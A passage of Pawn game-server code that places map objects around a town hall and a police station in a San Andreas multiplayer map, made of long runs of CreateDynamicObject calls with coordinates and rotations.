	CreateDynamicObject(8548,1356.09997559,-1742.40002441,13.80000019,0.00000000,0.00000000,180.00000000); //object(trainsign01_lvs) (1)
	CreateDynamicObject(1561,1351.59997559,-1759.59997559,12.39999962,0.00000000,0.00000000,180.00000000); //object(gen_doorext7_11r) (2)

	//                      AYUNTAMIENTO EXT.
    CreateObject(10377,1481.15000000,-1792.93000000,30.59000000,0.00000000,0.00000000,89.43000000); //

    CreateDynamicObject(7090,1481.28000000,-1774.69000000,35.03000000,0.00000000,8.00000000,90.00000000); //
    CreateDynamicObject(712,1465.09000000,-1774.37000000,22.06000000,0.00000000,0.00000000,270.00000000); //
    CreateDynamicObject(712,1497.77000000,-1774.39000000,22.00000000,0.00000000,0.00000000,270.00000000); //
    CreateDynamicObject(1215,1492.91000000,-1774.49000000,13.82000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(1215,1469.70000000,-1774.24000000,13.89000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(970,1453.10000000,-1742.30000000,13.10000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(970,1457.40000000,-1742.30000000,13.10000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(970,1461.60000000,-1742.30000000,13.10000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(970,1465.70000000,-1742.30000000,13.10000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(970,1473.40000000,-1742.30000000,13.10000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(970,1477.60000000,-1742.30000000,13.10000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(970,1487.10000000,-1742.30000000,13.10000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(970,1491.30000000,-1742.30000000,13.10000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(970,1500.50000000,-1742.30000000,13.10000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(970,1504.70000000,-1742.30000000,13.10000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(970,1508.80000000,-1742.30000000,13.10000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(640,1454.40000000,-1742.70000000,13.20000000,0.00000000,0.00000000,90.00000000); //
    CreateDynamicObject(640,1459.70000000,-1742.70000000,13.20000000,0.00000000,0.00000000,90.00000000); //
    CreateDynamicObject(640,1465.00000000,-1742.70000000,13.20000000,0.00000000,0.00000000,90.00000000); //
    CreateDynamicObject(640,1474.10000000,-1742.70000000,13.20000000,0.00000000,0.00000000,90.00000000); //
    CreateDynamicObject(640,1476.90000000,-1742.70000000,13.20000000,0.00000000,0.00000000,90.00000000); //
    CreateDynamicObject(640,1487.80000000,-1742.70000000,13.20000000,0.00000000,0.00000000,90.00000000); //
    CreateDynamicObject(640,1490.60000000,-1742.70000000,13.20000000,0.00000000,0.00000000,90.00000000); //
    CreateDynamicObject(640,1501.20000000,-1742.70000000,13.20000000,0.00000000,0.00000000,90.00000000); //
    CreateDynamicObject(640,1506.50000000,-1742.70000000,13.20000000,0.00000000,0.00000000,90.00000000); //
    CreateDynamicObject(640,1508.10000000,-1742.70000000,13.20000000,0.00000000,0.00000000,90.00000000); //
    CreateDynamicObject(970,1451.10000000,-1744.30000000,13.10000000,0.00000000,0.00000000,90.00000000); //
    CreateDynamicObject(970,1510.80000000,-1744.40000000,13.10000000,0.00000000,0.00000000,90.00000000); //
    CreateDynamicObject(1256,1451.50000000,-1744.50000000,13.20000000,0.00000000,0.00000000,180.00000000); //
    CreateDynamicObject(1256,1510.40000000,-1744.50000000,13.20000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(640,1453.81000000,-1742.70000000,13.20000000,0.00000000,0.00000000,90.00000000); //
    CreateDynamicObject(1216,1412.50000000,-1752.70000000,13.20000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(1216,1411.00000000,-1752.70000000,13.20000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(1216,1410.04000000,-1753.50000000,13.20000000,0.00000000,0.00000000,90.00000000); //
    CreateDynamicObject(1216,1410.04000000,-1755.00000000,13.20000000,0.00000000,0.00000000,90.00000000); //
    CreateDynamicObject(1216,1547.90000000,-1752.70000000,13.20000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(1216,1546.20000000,-1752.70000000,13.20000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(1216,1548.80000000,-1753.30000000,13.20000000,0.00000000,0.00000000,270.00000000); //
    CreateDynamicObject(1216,1548.80000000,-1755.00000000,13.20000000,0.00000000,0.00000000,270.00000000); //
    CreateDynamicObject(1223,1409.70000000,-1752.30000000,12.00000000,0.00000000,0.00000000,315.00000000); //
    CreateDynamicObject(1223,1549.20000000,-1752.40000000,12.00000000,0.00000000,0.00000000,215.00000000); //
    CreateDynamicObject(18981,1512.12000000,-1609.72000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1512.14000000,-1634.67000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1512.12000000,-1659.54000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1512.10000000,-1684.43000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1512.10000000,-1709.04000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1512.10000000,-1733.70000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1487.23000000,-1609.78000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1487.23000000,-1634.47000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1487.23000000,-1659.31000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1487.23000000,-1684.29000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1487.25000000,-1709.22000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1487.23000000,-1734.13000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1462.46000000,-1609.60000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1462.52000000,-1634.58000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1462.52000000,-1659.37000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1462.50000000,-1684.32000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1462.52000000,-1709.19000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1462.52000000,-1734.07000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1438.03000000,-1609.69000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1441.99000000,-1634.33000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1442.79000000,-1658.89000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1438.10000000,-1683.56000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1437.64000000,-1707.52000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(18981,1437.98000000,-1732.34000000,11.87000000,0.00000000,90.00000000,0.00000000); //
    CreateDynamicObject(655,1520.22000000,-1723.10000000,12.91000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(655,1438.17000000,-1723.05000000,12.89000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(3511,1462.22000000,-1718.38000000,12.77000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(3511,1482.94000000,-1718.67000000,13.00000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(712,1515.45000000,-1699.30000000,22.51000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(712,1515.75000000,-1678.49000000,22.44000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(3511,1482.92000000,-1659.16000000,12.88000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(3511,1462.18000000,-1659.31000000,12.80000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(712,1443.07000000,-1678.55000000,22.47000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(712,1443.10000000,-1699.15000000,22.45000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(655,1519.89000000,-1634.66000000,12.88000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(655,1438.46000000,-1634.64000000,12.84000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(16061,1485.49000000,-1602.62000000,12.38000000,0.00000000,0.00000000,90.00000000); //
    CreateDynamicObject(16061,1485.50000000,-1631.74000000,12.36000000,0.00000000,0.00000000,90.00000000); //
    CreateDynamicObject(6965,1482.81000000,-1616.72000000,15.99000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(1364,1461.06000000,-1631.56000000,13.14000000,0.00000000,0.00000000,180.00000000); //
    CreateDynamicObject(1364,1473.99000000,-1631.56000000,13.14000000,0.00000000,0.00000000,180.00000000); //
    CreateDynamicObject(1364,1492.50000000,-1631.56000000,13.14000000,0.00000000,0.00000000,180.00000000); //
    CreateDynamicObject(1364,1503.39000000,-1631.56000000,13.14000000,0.00000000,0.00000000,180.00000000); //
    CreateDynamicObject(1364,1503.63000000,-1602.17000000,13.14000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(1364,1492.48000000,-1602.17000000,13.14000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(1364,1476.86000000,-1602.17000000,13.14000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(1364,1461.43000000,-1602.17000000,13.14000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(3853,1438.14000000,-1601.00000000,16.17000000,0.00000000,0.00000000,90.00000000); //
    CreateDynamicObject(3853,1520.55000000,-1600.91000000,16.21000000,0.00000000,0.00000000,90.00000000); //
    CreateDynamicObject(1257,1436.48000000,-1629.19000000,13.59000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(1229,1435.56000000,-1626.23000000,13.85000000,0.00000000,0.00000000,270.00000000); //
    CreateDynamicObject(14468,1481.73000000,-1602.55000000,12.61000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(14468,1471.47000000,-1602.49000000,12.36000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(14468,1487.51000000,-1602.49000000,12.36000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(14468,1496.13000000,-1602.19000000,12.37000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(14468,1499.87000000,-1601.89000000,12.37000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(14468,1508.03000000,-1602.35000000,12.37000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(14468,1465.26000000,-1602.27000000,12.37000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(14468,1456.79000000,-1602.19000000,12.37000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(14468,1456.56000000,-1631.44000000,12.37000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(14468,1464.72000000,-1631.64000000,12.37000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(14468,1469.88000000,-1631.47000000,12.37000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(14468,1478.73000000,-1631.43000000,12.37000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(14468,1482.99000000,-1631.52000000,12.37000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(14468,1487.65000000,-1631.53000000,12.37000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(14468,1496.56000000,-1631.58000000,12.37000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(14468,1499.15000000,-1631.46000000,12.61000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(14468,1507.32000000,-1631.65000000,12.37000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(8623,1450.36000000,-1616.66000000,12.36000000,0.00000000,0.00000000,90.00000000); //
    CreateDynamicObject(647,1450.48000000,-1619.61000000,12.36000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(647,1450.37000000,-1616.41000000,12.67000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(647,1450.21000000,-1612.75000000,12.36000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(3439,1450.09000000,-1610.33000000,16.43000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(3439,1450.37000000,-1622.71000000,16.43000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(1294,1522.71000000,-1640.77000000,16.84000000,0.00000000,0.00000000,180.00000000); //
    CreateDynamicObject(1294,1522.71000000,-1656.79000000,16.84000000,0.00000000,0.00000000,180.00000000); //
    CreateDynamicObject(1294,1522.71000000,-1674.98000000,16.84000000,0.00000000,0.00000000,180.00000000); //
    CreateDynamicObject(1294,1522.71000000,-1702.54000000,16.84000000,0.00000000,0.00000000,180.00000000); //
    CreateDynamicObject(1294,1486.39000000,-1725.71000000,16.84000000,0.00000000,0.00000000,90.00000000); //
    CreateDynamicObject(1294,1458.80000000,-1725.71000000,16.84000000,0.00000000,0.00000000,90.00000000); //
    CreateDynamicObject(1294,1436.15000000,-1702.61000000,16.84000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(1294,1436.15000000,-1675.37000000,16.84000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(1294,1436.15000000,-1656.06000000,16.84000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(1294,1436.15000000,-1642.41000000,16.84000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(1359,1438.28000000,-1633.54000000,13.00000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(1359,1520.39000000,-1633.62000000,13.08000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(8673,1509.88000000,-1599.75000000,13.81000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(8673,1489.49000000,-1599.75000000,13.81000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(8673,1469.06000000,-1599.75000000,13.81000000,0.00000000,0.00000000,0.00000000); //
    CreateDynamicObject(8673,1448.63000000,-1599.75000000,13.81000000,0.00000000,0.00000000,0.00000000); //

	//                      LSPD Exterior
	CreateDynamicObject(869,1542.09960938,-1648.59960938,13.39999962,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (1)
	CreateDynamicObject(869,1542.09997559,-1645.09997559,13.39999962,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (2)
	CreateDynamicObject(869,1542.09997559,-1640.80004883,13.39999962,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (3)
	CreateDynamicObject(869,1542.09960938,-1638.29980469,13.39999962,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (4)
	CreateDynamicObject(869,1546.50000000,-1664.50000000,13.39999962,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (5)
	CreateDynamicObject(869,1546.50000000,-1660.79980469,13.39999962,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (6)
	CreateDynamicObject(869,1546.50000000,-1657.80004883,13.39999962,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (7)
	CreateDynamicObject(869,1546.19995117,-1686.59997559,13.39999962,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (8)
	CreateDynamicObject(869,1546.19995117,-1690.80004883,13.39999962,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (9)
	CreateDynamicObject(869,1546.69995117,-1692.80004883,13.39999962,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (10)
	CreateDynamicObject(869,1541.80004883,-1702.80004883,13.39999962,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (11)
	CreateDynamicObject(869,1541.80004883,-1706.30004883,13.39999962,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (12)
	CreateDynamicObject(869,1541.59997559,-1709.59997559,13.39999962,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (13)
	CreateDynamicObject(869,1541.59997559,-1713.09997559,13.39999962,0.00000000,0.00000000,0.00000000); //object(veg_pflowerswee) (14)
	CreateDynamicObject(970,1542.29980469,-1636.39941406,13.50000000,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (1)
	CreateDynamicObject(970,1539.80004883,-1638.90002441,13.50000000,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (2)
	CreateDynamicObject(970,1539.80004883,-1643.50000000,13.50000000,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (3)
	CreateDynamicObject(970,1539.80004883,-1648.30004883,13.50000000,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (4)
	CreateDynamicObject(970,1542.30004883,-1650.80004883,13.50000000,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (5)
	CreateDynamicObject(970,1546.69995117,-1656.09997559,13.50000000,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (6)
	CreateDynamicObject(970,1546.80004883,-1666.50000000,13.50000000,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (7)
	CreateDynamicObject(970,1546.80004883,-1684.59997559,13.50000000,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (8)
	CreateDynamicObject(970,1546.69995117,-1695.30004883,13.50000000,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (9)
	CreateDynamicObject(970,1542.30004883,-1700.30004883,13.50000000,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (10)
	CreateDynamicObject(970,1542.19995117,-1715.40002441,13.50000000,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (11)
	CreateDynamicObject(970,1544.09997559,-1658.59997559,13.50000000,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (12)
	CreateDynamicObject(970,1544.09997559,-1664.00000000,13.50000000,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (13)
	CreateDynamicObject(970,1549.30004883,-1663.90002441,13.50000000,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (14)
	CreateDynamicObject(970,1549.30004883,-1658.69995117,13.50000000,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (15)
	CreateDynamicObject(970,1543.90002441,-1687.19995117,13.50000000,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (16)
	CreateDynamicObject(970,1543.90002441,-1692.59997559,13.50000000,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (17)
	CreateDynamicObject(970,1549.40002441,-1692.59997559,13.50000000,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (18)
	CreateDynamicObject(970,1549.40002441,-1687.19995117,13.50000000,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (19)
	CreateDynamicObject(970,1539.50000000,-1703.00000000,13.50000000,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (20)
	CreateDynamicObject(970,1539.50000000,-1707.80004883,13.50000000,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (21)
	CreateDynamicObject(970,1539.50000000,-1712.69995117,13.50000000,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (22)
	CreateDynamicObject(1215,1539.89941406,-1650.59960938,13.50000000,0.00000000,0.00000000,0.00000000); //object(bollardlight) (1)
	CreateDynamicObject(1215,1539.80004883,-1636.50000000,13.50000000,0.00000000,0.00000000,0.00000000); //object(bollardlight) (5)
	CreateDynamicObject(1215,1544.69995117,-1650.59997559,13.50000000,0.00000000,0.00000000,0.00000000); //object(bollardlight) (6)
	CreateDynamicObject(1215,1544.19995117,-1656.30004883,13.50000000,0.00000000,0.00000000,0.00000000); //object(bollardlight) (7)
	CreateDynamicObject(1215,1544.19995117,-1666.30004883,13.50000000,0.00000000,0.00000000,0.00000000); //object(bollardlight) (8)
	CreateDynamicObject(1215,1549.19995117,-1666.30004883,13.50000000,0.00000000,0.00000000,0.00000000); //object(bollardlight) (9)
	CreateDynamicObject(1215,1549.09997559,-1656.19995117,13.50000000,0.00000000,0.00000000,0.00000000); //object(bollardlight) (10)
	CreateDynamicObject(1215,1544.00000000,-1684.69995117,13.50000000,0.00000000,0.00000000,0.00000000); //object(bollardlight) (11)
	CreateDynamicObject(1215,1544.09997559,-1695.19995117,13.50000000,0.00000000,0.00000000,0.00000000); //object(bollardlight) (12)
	CreateDynamicObject(1215,1549.40002441,-1695.19995117,13.50000000,0.00000000,0.00000000,0.00000000); //object(bollardlight) (13)
	CreateDynamicObject(1215,1549.30004883,-1684.69995117,13.50000000,0.00000000,0.00000000,0.00000000); //object(bollardlight) (14)
	CreateDynamicObject(1215,1544.69995117,-1700.59997559,13.50000000,0.00000000,0.00000000,0.00000000); //object(bollardlight) (15)
	CreateDynamicObject(1215,1539.69995117,-1700.50000000,13.50000000,0.00000000,0.00000000,0.00000000); //object(bollardlight) (16)
	CreateDynamicObject(1215,1539.69995117,-1715.19995117,13.50000000,0.00000000,0.00000000,0.00000000); //object(bollardlight) (17)
	CreateDynamicObject(1215,1544.50000000,-1714.80004883,13.50000000,0.00000000,0.00000000,0.00000000); //object(bollardlight) (18)
	CreateDynamicObject(1251,1588.00000000,-1606.19995117,12.50000000,0.00000000,0.00000000,0.00000000); //object(smashbar) (1)
	CreateDynamicObject(1251,1592.59997559,-1606.30004883,12.50000000,0.00000000,0.00000000,0.00000000); //object(smashbar) (2)
	CreateDynamicObject(1251,1597.59997559,-1606.50000000,12.50000000,0.00000000,0.00000000,0.00000000); //object(smashbar) (3)
	CreateDynamicObject(1251,1602.69995117,-1606.69995117,12.50000000,0.00000000,0.00000000,0.00000000); //object(smashbar) (4)
	CreateDynamicObject(8947,1552.19995117,-1610.00000000,11.39999962,0.00000000,0.00000000,90.00000000); //object(vgelkup) (1)
	CreateDynamicObject(3934,1546.30004883,-1610.00000000,15.19999981,0.00000000,0.00000000,0.00000000); //object(helipad01) (3)
	CreateDynamicObject(1557,1555.80004883,-1677.09997559,15.19999981,0.00000000,0.00000000,90.00000000); //object(gen_doorext19) (1)
	CreateDynamicObject(1557,1555.80004883,-1674.09997559,15.19999981,0.00000000,0.00000000,270.00000000); //object(gen_doorext19) (2)
	CreateDynamicObject(3851,1555.59997559,-1674.19995117,19.70000076,0.00000000,0.00000000,0.00000000); //object(carshowwin_sfsx) (1)
	CreateDynamicObject(1251,1582.69995117,-1606.09997559,12.50000000,0.00000000,0.00000000,0.00000000); //object(smashbar) (10)
	CreateDynamicObject(1251,1577.69995117,-1606.09997559,12.50000000,0.00000000,0.00000000,0.00000000); //object(smashbar) (11)
	CreateDynamicObject(4597,1589.79980469,-1602.69921875,12.89999962,0.00000000,0.00000000,0.00000000); //object(crprkblok4_lan2) (1)
	CreateDynamicObject(1251,1572.09997559,-1606.40002441,12.50000000,0.00000000,0.00000000,0.00000000); //object(smashbar) (12)
	CreateDynamicObject(4597,1607.80004883,-1620.30004883,12.89999962,0.00000000,0.00000000,90.00000000); //object(crprkblok4_lan2) (2)
	CreateDynamicObject(1251,1604.69995117,-1618.09997559,12.50000000,0.00000000,0.00000000,270.00000000); //object(smashbar) (13)
	CreateDynamicObject(1251,1604.50000000,-1622.40002441,12.50000000,0.00000000,0.00000000,270.00000000); //object(smashbar) (15)
	CreateDynamicObject(1251,1604.40002441,-1626.90002441,12.50000000,0.00000000,0.00000000,270.00000000); //object(smashbar) (16)
	CreateDynamicObject(1251,1604.40002441,-1631.50000000,12.50000000,0.00000000,0.00000000,270.00000000); //object(smashbar) (17)

	CreateObject(18452,1558.09997559,-1610.30004883,11.80000019,0.00000000,0.00000000,0.00000000); //object(cw_tscanopy01) (1)

	CreateDynamicObject(3934,1558.19995117,-1610.09997559,15.19999981,0.00000000,0.00000000,0.00000000); //object(helipad01) (3)
	CreateDynamicObject(3050,1544.19995117,-1617.69995117,14.89999962,0.00000000,0.00000000,180.00000000); //object(des_quarrygate2) (2)
	CreateDynamicObject(3050,1539.59960938,-1617.69921875,14.89999962,0.00000000,0.00000000,179.99450684); //object(des_quarrygate2) (5)
	CreateDynamicObject(3050,1539.69995117,-1613.09997559,14.89999962,0.00000000,0.00000000,90.00000000); //object(des_quarrygate2) (6)
	CreateDynamicObject(3050,1539.69995117,-1608.50000000,14.89999962,0.00000000,0.00000000,89.99450684); //object(des_quarrygate2) (7)
	CreateDynamicObject(3050,1539.69995117,-1603.90002441,14.89999962,0.00000000,0.00000000,89.99450684); //object(des_quarrygate2) (8)
	CreateDynamicObject(3050,1539.69995117,-1602.40002441,14.89999962,0.00000000,0.00000000,89.99450684); //object(des_quarrygate2) (9)
	CreateDynamicObject(3050,1544.30004883,-1602.50000000,14.89999962,0.00000000,0.00000000,0.00000000); //object(des_quarrygate2) (10)
	CreateDynamicObject(3050,1548.90002441,-1602.50000000,14.89999962,0.00000000,0.00000000,0.00000000); //object(des_quarrygate2) (11)
	CreateDynamicObject(3050,1553.50000000,-1602.50000000,14.89999962,0.00000000,0.00000000,0.00000000); //object(des_quarrygate2) (12)
	CreateDynamicObject(3050,1558.09997559,-1602.50000000,14.89999962,0.00000000,0.00000000,0.00000000); //object(des_quarrygate2) (13)
	CreateDynamicObject(3050,1562.69995117,-1602.50000000,14.89999962,0.00000000,0.00000000,0.00000000); //object(des_quarrygate2) (14)
	CreateDynamicObject(3050,1567.30004883,-1602.50000000,14.89999962,0.00000000,0.00000000,0.00000000); //object(des_quarrygate2) (15)
	CreateDynamicObject(3050,1571.90002441,-1602.50000000,14.89999962,0.00000000,0.00000000,0.00000000); //object(des_quarrygate2) (16)
	CreateDynamicObject(3050,1576.50000000,-1602.50000000,14.89999962,0.00000000,0.00000000,0.00000000); //object(des_quarrygate2) (17)
	CreateDynamicObject(3050,1581.09997559,-1602.50000000,14.89999962,0.00000000,0.00000000,0.00000000); //object(des_quarrygate2) (18)
	CreateDynamicObject(3050,1585.69995117,-1602.50000000,14.89999962,0.00000000,0.00000000,0.00000000); //object(des_quarrygate2) (19)
	CreateDynamicObject(3050,1590.30004883,-1602.50000000,14.89999962,0.00000000,0.00000000,0.00000000); //object(des_quarrygate2) (20)
	CreateDynamicObject(3050,1594.90002441,-1602.50000000,14.89999962,0.00000000,0.00000000,0.00000000); //object(des_quarrygate2) (21)
	CreateDynamicObject(3050,1599.50000000,-1602.50000000,14.89999962,0.00000000,0.00000000,0.00000000); //object(des_quarrygate2) (22)
	CreateDynamicObject(3050,1604.09997559,-1602.50000000,14.89999962,0.00000000,0.00000000,0.00000000); //object(des_quarrygate2) (23)
	CreateDynamicObject(3050,1608.00000000,-1602.50000000,14.89999962,0.00000000,0.00000000,0.00000000); //object(des_quarrygate2) (24)
	CreateDynamicObject(3050,1607.90002441,-1607.09997559,14.89999962,0.00000000,0.00000000,270.00000000); //object(des_quarrygate2) (25)
	CreateDynamicObject(3050,1607.90002441,-1611.69995117,14.89999962,0.00000000,0.00000000,269.98901367); //object(des_quarrygate2) (26)
	CreateDynamicObject(3050,1607.90002441,-1616.30004883,14.89999962,0.00000000,0.00000000,269.98901367); //object(des_quarrygate2) (27)
	CreateDynamicObject(3050,1607.90002441,-1620.90002441,14.89999962,0.00000000,0.00000000,269.98901367); //object(des_quarrygate2) (28)
	CreateDynamicObject(3050,1607.90002441,-1625.50000000,14.89999962,0.00000000,0.00000000,269.98901367); //object(des_quarrygate2) (29)
	CreateDynamicObject(3050,1607.90002441,-1630.09997559,14.89999962,0.00000000,0.00000000,269.98901367); //object(des_quarrygate2) (30)
	CreateDynamicObject(3050,1607.90002441,-1634.69995117,14.89999962,0.00000000,0.00000000,269.98901367); //object(des_quarrygate2) (31)
	CreateDynamicObject(3050,1607.90002441,-1638.00000000,14.89999962,0.00000000,0.00000000,269.98901367); //object(des_quarrygate2) (32)
	CreateDynamicObject(3050,1603.30004883,-1638.00000000,14.89999962,0.00000000,0.00000000,179.99450684); //object(des_quarrygate2) (33)
	CreateDynamicObject(3050,1548.80004883,-1617.69995117,14.80000019,0.00000000,0.00000000,89.99450684); //object(des_quarrygate2) (2)
	CreateDynamicObject(1215,1547.80004883,-1701.69995117,27.79999924,0.00000000,0.00000000,0.00000000); //object(bollardlight) (1)
	CreateDynamicObject(3877,1552.59997559,-1672.50000000,15.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (1)
	CreateDynamicObject(3877,1552.59997559,-1678.80004883,15.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (2)
	CreateDynamicObject(3578,1548.80004883,-1622.69995117,11.80000019,0.00000000,0.00000000,90.00000000); //object(dockbarr1_la) (2)
	CreateDynamicObject(3578,1548.80004883,-1633.00000000,11.80000019,0.00000000,0.00000000,90.00000000); //object(dockbarr1_la) (3)
	CreateDynamicObject(3050,1548.80004883,-1633.19995117,14.80000019,0.00000000,0.00000000,89.99450684); //object(des_quarrygate2) (2)
	CreateDynamicObject(3877,1574.59997559,-1620.30004883,14.00000000,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (3)
	CreateDynamicObject(3877,1563.90002441,-1617.00000000,14.00000000,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (4)
	CreateDynamicObject(3877,1563.90002441,-1603.30004883,14.00000000,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (5)
	CreateDynamicObject(3877,1541.30004883,-1603.30004883,14.00000000,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (6)
